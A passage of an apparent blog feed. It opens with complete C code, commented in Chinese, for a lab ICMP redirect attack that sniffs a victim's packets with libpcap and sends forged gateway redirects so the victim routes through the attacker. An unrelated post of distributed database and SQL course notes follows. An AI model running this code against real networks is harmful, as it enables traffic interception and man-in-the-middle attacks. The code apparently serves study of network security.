class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pcap.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip_icmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATA_LEN 8    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_ETHERNET 14</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HEAD_MAX 64</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> Vic_IP;   <span class="comment">//被攻击者IP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> Ori_Gw_IP; <span class="comment">//网关IP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> Redic_IP; <span class="comment">//攻击者IP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint16_t</span> ip_id=<span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//参考 https://blog.csdn.net/wangzhen_csdn/article/details/80461269</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//计算校验和</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint16_t <span class="title">checksum</span><span class="params">(<span class="keyword">void</span> *buf,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> sum=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> *cbuf=buf;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(len&gt;<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        sum+=*cbuf++;</span><br><span class="line"></span><br><span class="line">        len-=<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(len)</span><br><span class="line"></span><br><span class="line">        sum+=*(<span class="keyword">u_int8_t</span> *)cbuf;</span><br><span class="line"></span><br><span class="line">    sum=(sum&gt;&gt;<span class="number">16</span>)+(sum &amp; <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    sum+=(sum&gt;&gt;<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ~sum;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPacket</span><span class="params">(u_char * arg, <span class="keyword">const</span> struct pcap_pkthdr * pkthdr, <span class="keyword">const</span> u_char * packet)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> sockfd,res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> one = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *ptr_one = &amp;one;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1:AF_INET参数 表示用于处理ip层的数据  2:SOCK_RAW 指定用原始套接字编程 3:指定icmp报文</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果 socket没有创建成功 会返回负值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))&lt;<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"create sockfd error\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//参数1：sockfd 要被设置或者获取选项的套接字 2:IP选项 </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3：IP_HDRINCL 如果没有开启IP_HDRINCL选项，那么内核会帮忙处理IP头部。如果设置了IP_HDRINCL选项，那么用户需要自己生成IP头部的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4:ptr_one 作为选项值的缓冲</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5: 选项值的长度</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, <span class="keyword">sizeof</span>(one));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(res &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error--\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span>*<span class="title">ipd</span>=(<span class="title">struct</span> <span class="title">iphdr</span>*)(<span class="title">packet</span>+<span class="title">SIZE_ETHERNET</span>);</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> re_size=(ipd-&gt;ihl&lt;&lt;<span class="number">2</span>)+DATA_LEN; <span class="comment">//获取首部长度5 左移两位 re_size 28 bytes</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> all_size=<span class="keyword">sizeof</span>(struct iphdr)+<span class="keyword">sizeof</span>(struct icmphdr)+re_size;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> <span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">icmphdr</span> <span class="title">icmp</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">uint8_t</span> data[HEAD_MAX+DATA_LEN];</span><br><span class="line"></span><br><span class="line">        &#125;packet=&#123;</span><br><span class="line"></span><br><span class="line">            .ip=&#123;</span><br><span class="line"></span><br><span class="line">                .version = <span class="number">4</span>,</span><br><span class="line"></span><br><span class="line">                .ihl = <span class="number">5</span>, <span class="comment">//首部长度</span></span><br><span class="line"></span><br><span class="line">                .id=ip_id++,</span><br><span class="line"></span><br><span class="line">                .tos = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                .tot_len = htons(all_size),  <span class="comment">//host to network long 网络字节序</span></span><br><span class="line"></span><br><span class="line">                .frag_off = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                .ttl = <span class="number">255</span>,</span><br><span class="line"></span><br><span class="line">                .check = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                .protocol = IPPROTO_ICMP,</span><br><span class="line"></span><br><span class="line">                .saddr = Ori_Gw_IP,</span><br><span class="line"></span><br><span class="line">     .daddr = Vic_IP</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">            .icmp=&#123;</span><br><span class="line"></span><br><span class="line">                .type = ICMP_REDIRECT,</span><br><span class="line"></span><br><span class="line">                .code = ICMP_REDIR_HOST,</span><br><span class="line"></span><br><span class="line">                .checksum = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">                .un=&#123;</span><br><span class="line"></span><br><span class="line">                    .gateway=Redic_IP</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">memcpy</span>(packet.data,ipd,re_size); <span class="comment">//memcpy 把构造的ip数据报放到packet.data中</span></span><br><span class="line"></span><br><span class="line">        packet.ip.check = checksum(&amp;packet.ip, <span class="keyword">sizeof</span>(packet.ip));</span><br><span class="line"></span><br><span class="line">        packet.icmp.checksum = checksum(&amp;packet.icmp, <span class="keyword">sizeof</span>(packet.icmp)+re_size);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest</span>=&#123;</span></span><br><span class="line"></span><br><span class="line">            .sin_family=AF_INET,</span><br><span class="line"></span><br><span class="line">            .sin_addr=&#123;</span><br><span class="line"></span><br><span class="line">                .s_addr=(Vic_IP)</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        sendto(sockfd,&amp;packet,all_size,<span class="number">0</span>,(struct sockaddr *)&amp;dest,<span class="keyword">sizeof</span>(dest));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">(<span class="keyword">char</span> *cmd,<span class="keyword">char</span> *out)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//popen 创建出一个管道，然后执行CMD命令，返回值为FILE* 指针类型，由于管道数据流是单向的，command只能产生stdout或者读取stdin</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">// 参数'r' 表示CMD从管道中读取数据流，而w表示command的stdout输出到管道中</span></span><br><span class="line"></span><br><span class="line">    FILE *fp=popen(cmd,<span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//fscanf 是用于格式化输入到out中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fscanf</span>(fp,<span class="string">"%s"</span>,out);</span><br><span class="line"></span><br><span class="line">    pclose(fp);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argv,<span class="keyword">char</span> *args[])</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    assert(argv==<span class="number">2</span>); <span class="comment">//asert 作用是判断条件argv==2 是否为真，如果为假 打印出错信息    因为在linux上运行shi ./filename ip_addr 判断 argv==2 </span></span><br><span class="line"></span><br><span class="line">    Vic_IP=inet_addr(args[<span class="number">1</span>]); <span class="comment">// 执行文件的时候传入 受害者IP地址      </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> errBuf[PCAP_ERRBUF_SIZE], * devStr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get a device */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取网络接口设备名,成功就返回设备名指针，失败的话返回NULL，同时,errbuf存放出错误信息字符串</span></span><br><span class="line"></span><br><span class="line">    devStr = pcap_lookupdev(errBuf);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(devStr)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"success: device: %s\n"</span>, devStr);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error: %s\n"</span>, errBuf);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ifconfig eth0 | awk '$1 ~/inet$/ &#123;print $2&#125;' | awk -F: '&#123;print $2&#125;'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//上面是一条Linux命令，用于截取ifconfig eth0 的IP地址 格式化输出到buf中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">"ifconfig %s|awk '$1 ~ /inet$/ &#123;print $2&#125;'|awk -F: '&#123;print $2&#125;'"</span>,devStr);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//run函数用于解析出 攻击者的IP 保存到char ip[16];</span></span><br><span class="line"></span><br><span class="line">    run(buf,ip);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    Redic_IP=inet_addr(ip);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印攻击者的IP</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"get ip %s\n"</span>,ip);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//route|awk '$1 ~ /default/ &#123;print $2&#125;'</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//上面是一条Linux命令，用于截取eth0的网关地址 格式化输出到buf中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(buf,<span class="string">"route|awk '$1 ~ /default/ &#123;print $2&#125;'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//同理 run函数用于解析出攻击者的网关 保存到char ip[16]中</span></span><br><span class="line"></span><br><span class="line">    run(buf,ip);</span><br><span class="line"></span><br><span class="line">    Ori_Gw_IP=inet_addr(ip);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"get gateway %s\n"</span>,ip);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* open a device, wait until a packet arrives */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据上一步获得的网络接口设备名 打开网络接口  参数1:网络接口的名字 2：捕获数据包的长度 3:开启混杂模式 4:指定等待毫秒数 0表示一直等待 直到有数据报 5:存储错误信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pcap_t</span> * device = pcap_open_live(devStr, <span class="number">65535</span>, <span class="number">1</span>, <span class="number">0</span>, errBuf);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置过滤条件</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">filter</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> filterstr[<span class="number">50</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//src host 指定只接受源IP是 被攻击者IP的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(filterstr,<span class="string">"src host %s"</span>,args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//参数1： 上一步获得的设备接口指针 2、应用过滤条件 3、之前设置的过滤条件：即只接受源IP是被攻击者的IP地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4: 表示是否需要优化过滤表达式 1表示优化 5：mask 指定本地网络的网络掩码，不需要时写0</span></span><br><span class="line"></span><br><span class="line">    pcap_compile(device,&amp;filter,filterstr,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//应用过滤规则</span></span><br><span class="line"></span><br><span class="line">    pcap_setfilter(device,&amp;filter);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//参数：1：上一步获得的设备接口指针 2:指定捕获数据包的个数，一旦抓到了 cnt 个数据包，pcap_loop 立即返回。如果是 -1，就会永无休止的捕获，直到出现错误。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3:getPacket 回调函数，名字任意，根据需要自行起名。 4: 向回调函数中传递的参数 一般设置为NULL</span></span><br><span class="line"></span><br><span class="line">    pcap_loop(device, <span class="number">-1</span>, getPacket, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;说明：&lt;/p&gt;
&lt;p&gt;攻击者主机 192.168.18.43&lt;/p&gt;
&lt;p&gt;受害者主机 192.168.18.44&lt;/p&gt;
&lt;p&gt;网关 192.168.18.254&lt;/p&gt;
&lt;p&gt;一、Netwox命令实现重定向&lt;/p&gt;
&lt;p&gt;1、查看主机ICMP重定向是否开启&lt;/p&gt;
&lt;p
      
    
    </summary>
    
      <category term="信息安全" scheme="http://JKZhang.github.io/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="计算机网络" scheme="http://JKZhang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
      <category term="ICMP" scheme="http://JKZhang.github.io/tags/ICMP/"/>
    
      <category term="信息安全" scheme="http://JKZhang.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="网络安全" scheme="http://JKZhang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="ip" scheme="http://JKZhang.github.io/tags/ip/"/>
    
      <category term="重定向" scheme="http://JKZhang.github.io/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>分布式数据库——第二章 数据与数据模型</title>
    <link href="http://JKZhang.github.io/2019/03/%E5%88%86%E5%B8%83%E5%BC%8F%E6%95%B0%E6%8D%AE%E5%BA%93%E2%80%94%E2%80%94%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E6%95%B0%E6%8D%AE%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%A8%A1%E5%9E%8B/"/>
    <id>http://JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/</id>
    <published>2019-03-29T14:34:00.000Z</published>
    <updated>2019-04-01T13:17:49.474Z</updated>
    
    <content type="html"><![CDATA[<p>1.数据与数据模型</p><p>•数据</p><p> – 给定事实</p><p>•数据模型 </p><p>– 抽象的, 自含的, 对象和操作符等的逻辑定义, 所有这些一起组成了抽象机</p><p>•实现</p><p> – 真实机器上的物理实现</p><p>•数据抽象</p><p>–实体与联系</p><p>实体（Entities）</p><p>supplier, part, project, warehouse, employee ….</p><p>联系（Relationships）</p><p>sp, sj, spj…….</p><p>–特征 (Properties)</p><p>供应商 : location….</p><p>零件 : weight …..</p><p>2.数据独立</p><p>•数据库技术的主要目标</p><p>•适应应用需求，数据物理表示和访问技术的改变是必要的</p><p>•两类独立性</p><ul><li><p>物理数据独立</p></li><li><ul><li>当数据库的内部存储结构发生改变时，只要修改模式/内模式映象，可保持概念模式不变，从而保持外模式以及用户程序的不变，保证了数据与程序的物理独立性——数据的物理独立性</li></ul></li><li><p>逻辑数据独立</p></li><li><ul><li>当概念模式发生改变时，只要修改外模式/模式映象，可保持外模式不变，从而保持用户应用程序不变，保证了数据与用户程序的逻辑独立性——数据的逻辑独立性</li></ul></li></ul><p>3.体系结构</p><p>•三层体系结构</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image001.png" alt="clip_image001"></p><p>•外模式</p><ul><li>单个用户所看到的局部数据的逻辑结构和特征的描述</li><li>建立在概念模式之上，同一概念模式上可有多个不同的外模式</li><li>通过外模式DDL进行定义</li></ul><p>•概念模式</p><ul><li>数据库中全体数据的逻辑结构和特征的描述</li><li>一个数据库只有一个概念模式</li><li>通过模式DDL进行定义</li></ul><p>•内模式</p><ul><li>数据物理结构和存储方式的描述</li><li>一个数据库只有一个内模式</li><li>通过内模式DDL定义</li></ul><p>4.关系模型</p><p>•术语</p><ul><li><p>域 （Domain）</p></li><li><ul><li>一组具有相同数据类型的值的集合。每个属性有一个域</li></ul></li><li><p>属性 （Attribute）</p></li><li><ul><li>二维表格的每一列</li></ul></li><li><p>元组 （Tuple）</p></li><li><ul><li>每一行称为关系的一个元组</li></ul></li><li><p>基数 （Cardinality） 元组的数目</p></li><li><p>度 （Degree） 列的数目</p></li></ul><p>•性质</p><ul><li><p>一个关系是一个规范化的二维表格</p></li><li><ul><li>属性值不可分解</li></ul></li></ul><p>不允许表中有表</p><ul><li>元组不可重复</li></ul><p>因此一个关系模式至少存在一个候选码</p><ul><li>没有行序，即元组之间无序</li></ul><p>关系是元组的集合，集合的元素是无序的</p><ul><li>没有列序，即属性之间无序</li></ul><p>关系模式是属性的集合</p><p>•操作</p><ul><li>选择 （select）</li></ul><p>从表中抽取指定的行</p><ul><li>投影 （ Project）</li></ul><p>从表中抽取指定的列</p><ul><li>连接 （Join）</li></ul><p>在公共列的基础上连接两个表</p><ul><li>以集合为单元操作</li></ul><p>算子和结果都是表</p><ul><li>闭包性质</li></ul><p>一个操作的的输出结果可以是另一个操作的输入</p><p>•Key</p><ul><li>候选键（Candidate Keys）</li></ul><p>当且仅当如下条件成立K 是关系R候选键</p><ul><li>唯一性（Uniqueness）</li><li>最小性（Irreducibility）</li><li>e.g. S(s#) 是键,</li></ul><p>S(s#, age) 是超键（ super key ）</p><ul><li>主关键字(Primary Keys)与候选键</li></ul><p>Primary key 是被关系选中的候选键</p><ul><li>主关键字不能取空值（not null）</li><li>外关键字（Foreign Key）</li></ul><p>– R2 是一关系, R2 中的外关键字是R2的一组属性, FK, 满足:</p><ul><li>存在关系R1 有候选键 CK</li><li><p>R2 中的每个FK 值一定与 R1中某个元组的CK值相等.</p></li><li><p>引用完整性</p></li></ul><p>数据库不能含有任何不匹配的外关键字</p><ul><li>ON DELETE</li></ul><p>CASCADE/RESTRICT/NO ACTION</p><ul><li>ON UPDATE</li></ul><p>CASCADE/RESTRICT/NO ACTION</p><p>解释：引用关系做删除和更新操作的影响：CASCADE跟随一起变化，RESTRICT受限，不允许删除和更新，NO ACTION 不变化——引用完整性受到影响。</p><p>•语言 （SQL，代数）</p><ul><li><p>DDL 数据库定义语言</p></li><li><ul><li>创建create</li></ul></li></ul><p>– Table</p><p>– View</p><p>– Index</p><ul><li>例：</li></ul><p>创建表：</p><p>Create Table DEPT ( DEPT# Number,</p><p>DNAME Char(5),</p><p>Budget Number( 7,2));</p><p>创建索引：</p><p>Create index I1 on EMP (E#);</p><p>Create index I2 on EMP (Ename);</p><p>创建唯一性索引：</p><p>Create unique index I1 on EMP (E#);</p><p>创建聚集索引（</p><p>元组按照索引值顺序，物理上尽可能的存储在一起 ,在索引值上执行扫描（scan）操作时可以减少 I/O.）：</p><p>Create cluster index CI1 on EMP (E#);</p><p>含有完整性定义得关系定义例子：</p><p>Create Table SP ( s# s# not null,</p><p>p# p# not null, qty qty not null,</p><p>primary key (s#, p#),</p><p>foreign key (s#) references S</p><p>on delete cascade</p><p>on update cascade,</p><p>foreign key (p#) references P</p><p>on delete cascade</p><p>on update cascade,</p><p>check (qty &gt;0 and qty &lt;5001) );</p><ul><li><p>DML数据库操纵语言</p></li><li><ul><li>查询select</li></ul></li><li><ul><li>例：</li></ul></li></ul><p>查询年龄40岁以下不同部门平均工资大于6000的部门，并按部门降序列表。</p><p>select d#, avg (SAL) from EMP where age &lt; 40</p><p>group by d# having avg (SAL) &gt; 6000</p><p>order by d# desc；</p><p>查询在sale部门工作的职工名。</p><p>select distinct Ename from EMP where d# in</p><p>(select d# from DEPT</p><p>where Dname=‘sale’)</p><p>查询缺少某门课成绩的学生学号。</p><p>Select s# From SC Where score IS NULL</p><p>查询只选修了1门或2门课程的学生学号、姓名和课程数。</p><p>Select student.s#, sname, count_c# From (Select s# as s#, count(s#) as count_c# From sc Group by s#) SC2, student Where sc2.s# = student.s# and (count_c#=1 OR count_c#=2)</p><ul><li><p>删除delete</p></li><li><p>例：</p></li></ul><p>删除所有低于平均工资的职工 。</p><p>delete from EMP where SAL &lt; (select avg (SAL) from EMP)</p><ul><li><p>插入insert</p></li><li><p>例：</p></li></ul><p>insert into S (status, city, s#, sname) values (20, ‘shanghai’, ‘s6’, ‘wang ping’ )；</p><p>对所有在黄山路 支行的贷款者$200 存款的礼物。</p><p>insert into account select loan-number, branch-name, 200 from loan where branch-name = ‘huangshanlu’</p><ul><li><p>更新update</p></li><li><p>例：</p></li></ul><p>工资大于 $4,000 的增加 6%, 其他职工工资增加 5%.</p><p><img src="//JKZhang.github.io/2019/03/分布式数据库——第二章：数据与数据模型/clip_image002.png" alt="clip_image002"></p><ul><li><p>嵌入SQL</p></li><li><ul><li>单元组查询</li></ul></li></ul><p>EXEC SQL Select Ename INTO :ename</p><p>From EMP Where e# = ‘e1’</p><ul><li>查询供应了amount 数量零件的供应商名字和其所在的城市，先定义游标（ cursor）</li></ul><p>EXEC SQL</p><p>declare c cursor for </p><p>select sname, city </p><p>from S, SP</p><p>where S.s# = SP.s# </p><p>and SP.QTY &gt; :amount</p><p>游标打开语句（ open ），执行游标查询</p><p>EXEC SQL open c</p><p>游标取语句（fetch ）获取一个元组送入主变量</p><p>EXEC SQL fetch c into :cn, 